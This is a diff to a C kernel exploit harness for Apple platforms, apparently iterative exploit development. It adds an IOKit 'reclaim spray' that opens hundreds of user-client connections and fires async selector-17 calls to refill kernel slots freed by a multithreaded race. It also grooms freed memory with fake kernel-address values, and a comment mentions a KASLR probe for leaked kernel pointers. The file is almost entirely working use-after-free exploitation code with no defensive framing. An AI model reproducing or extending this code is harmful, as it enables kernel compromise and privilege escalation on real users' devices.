@@ -1511,6 +1511,42 @@ static void p13_groom_fake(uint64_t addr, uint64_t val, int inSz) {
     }
 }
 
+/* r=225 reclaim spray — fills freed GEN2 entries via sel17 on fresh connections */
+#define P13_RECLAIM_MAX 640
+static io_connect_t p13_reclaim_conns[P13_RECLAIM_MAX];
+static int p13_reclaim_n = 0;
+static io_service_t p13_reclaim_svc = IO_OBJECT_NULL;
+
+static void p13_free_reclaim(void) {
+    for (int i = 0; i < p13_reclaim_n; i++)
+        if (p13_reclaim_conns[i]) IOServiceClose(p13_reclaim_conns[i]);
+    p13_reclaim_n = 0;
+}
+
+static int p13_reclaim_spray(int count, uint64_t tag) {
+    if (!p13_reclaim_svc) return 0;
+    uint64_t inp[3] = {1, 2, 3};
+    int added = 0;
+    for (int i = 0; i < count && p13_reclaim_n < P13_RECLAIM_MAX; i++) {
+        io_connect_t c = IO_OBJECT_NULL;
+        if (IOServiceOpen(p13_reclaim_svc, mach_task_self(), 0, &c) != KERN_SUCCESS) continue;
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = tag | i;
+        kern_return_t kr = IOConnectCallAsyncMethod(c, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        mach_port_deallocate(mach_task_self(), wp);
+        if (kr == KERN_SUCCESS) {
+            p13_reclaim_conns[p13_reclaim_n++] = c;
+            added++;
+        } else {
+            IOServiceClose(c);
+        }
+    }
+    return added;
+}
+
 /* Phase 16 concurrent groom spray thread */
 /* r=195 VT encode callback */
 static CMSampleBufferRef r195_enc_out = NULL;
@@ -17095,7 +17131,7 @@ new_modes:
             rlog("*** rounds=%d: fast-path to Phase 16 ***\n", rounds);
             goto phase15_done;
         }
-        if (rounds >= 170 && rounds != 219) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -19289,6 +19325,11 @@ new_modes:
             rlog("  Render loop running, frames=%d\n", p13_render_frames);
 
             /* Stage C: race variants during render loop */
+            if (rounds == 225) {
+                p13_reclaim_svc = svc13;
+                p13_reclaim_n = 0;
+                rlog("  r=225: reclaim spray enabled (sel17 GEN2 reclaim)\n");
+            }
             uint64_t inp13[3] = {1, 2, 3};
 
             /* v_race8: 8 connections, spam threads, staggered close */
@@ -19328,24 +19369,29 @@ new_modes:
                 for (int t = 0; t < 8; t++) pthread_join(spam_th[t], NULL);
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
-                /* Groom the freed slots */
-                p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
-
-                /* Check wake ports for notifications */
-                int msg_count = 0;
-                for (int gi = 0; gi < p13_groom_n && gi < 50; gi++) {
-                    uint8_t msg_buf[256];
-                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
-                    memset(msg_buf, 0, sizeof(msg_buf));
-                    hdr->msgh_size = sizeof(msg_buf);
-                    hdr->msgh_local_port = p13_groom_wps[gi];
-                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                        0, sizeof(msg_buf), p13_groom_wps[gi], 5, MACH_PORT_NULL);
-                    if (mr == MACH_MSG_SUCCESS) msg_count++;
+                /* Groom/reclaim the freed slots */
+                if (rounds == 225) {
+                    int rcl = p13_reclaim_spray(16, 0xAA22500000000000ULL | (iter << 8));
+                    rlog("    v_race8[%d] spam=%llu reclaim=%d total_rcl=%d\n", iter,
+                        (unsigned long long)p13_spam_count, rcl, p13_reclaim_n);
+                } else {
+                    p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+                    /* Check wake ports for notifications */
+                    int msg_count = 0;
+                    for (int gi = 0; gi < p13_groom_n && gi < 50; gi++) {
+                        uint8_t msg_buf[256];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                        memset(msg_buf, 0, sizeof(msg_buf));
+                        hdr->msgh_size = sizeof(msg_buf);
+                        hdr->msgh_local_port = p13_groom_wps[gi];
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msg_buf), p13_groom_wps[gi], 5, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) msg_count++;
+                    }
+                    if (msg_count > 0 || iter < 3)
+                        rlog("    v_race8[%d] spam=%llu msgs=%d\n", iter,
+                            (unsigned long long)p13_spam_count, msg_count);
                 }
-                if (msg_count > 0 || iter < 3)
-                    rlog("    v_race8[%d] spam=%llu msgs=%d\n", iter,
-                        (unsigned long long)p13_spam_count, msg_count);
                 p13_free_groom();
             }
 
@@ -19398,22 +19444,28 @@ new_modes:
                 for (int t = 0; t < 6; t++) pthread_join(spam_th[t], NULL);
                 for (int i = 0; i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
 
-                p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
-                int msg_count = 0;
-                for (int gi = 0; gi < p13_groom_n && gi < 50; gi++) {
-                    uint8_t msg_buf[256];
-                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
-                    memset(msg_buf, 0, sizeof(msg_buf));
-                    hdr->msgh_size = sizeof(msg_buf);
-                    hdr->msgh_local_port = p13_groom_wps[gi];
-                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                        0, sizeof(msg_buf), p13_groom_wps[gi], 5, MACH_PORT_NULL);
-                    if (mr == MACH_MSG_SUCCESS) msg_count++;
+                if (rounds == 225) {
+                    int rcl = p13_reclaim_spray(16, 0xBB22500000000000ULL | (iter << 8));
+                    rlog("    v_big[%d] spam=%llu reclaim=%d total_rcl=%d\n", iter,
+                        (unsigned long long)p13_spam_count, rcl, p13_reclaim_n);
+                } else {
+                    p13_groom_fake(0xfffffff007000000ULL, 0x43414E415259ULL, 24);
+                    int msg_count = 0;
+                    for (int gi = 0; gi < p13_groom_n && gi < 50; gi++) {
+                        uint8_t msg_buf[256];
+                        mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                        memset(msg_buf, 0, sizeof(msg_buf));
+                        hdr->msgh_size = sizeof(msg_buf);
+                        hdr->msgh_local_port = p13_groom_wps[gi];
+                        kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(msg_buf), p13_groom_wps[gi], 5, MACH_PORT_NULL);
+                        if (mr == MACH_MSG_SUCCESS) msg_count++;
+                    }
+                    if (msg_count > 0 || iter < 2)
+                        rlog("    v_big[%d] spam=%llu msgs=%d\n", iter,
+                            (unsigned long long)p13_spam_count, msg_count);
+                    p13_free_groom();
                 }
-                if (msg_count > 0 || iter < 2)
-                    rlog("    v_big[%d] spam=%llu msgs=%d\n", iter,
-                        (unsigned long long)p13_spam_count, msg_count);
-                p13_free_groom();
                 CFRelease(swn); CFRelease(shn); CFRelease(sbn); CFRelease(srn); CFRelease(spfn);
                 CFRelease(sp);
             }
@@ -19533,6 +19585,12 @@ new_modes:
             }
 
             /* Stop render loop */
+            if (rounds == 225) {
+                rlog("  r=225: SURVIVED Phase 13! reclaim_conns=%d frames=%d\n",
+                    p13_reclaim_n, p13_render_frames);
+                p13_free_reclaim();
+                p13_reclaim_svc = IO_OBJECT_NULL;
+            }
             p13_render_run = 0;
             pthread_join(render_th, NULL);
             rlog("  Render loop stopped, total frames=%d\n", p13_render_frames);
@@ -20192,9 +20250,9 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if (rounds >= 220 && rounds <= 223) goto r220_block;
+            if (rounds >= 220 && rounds <= 224) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
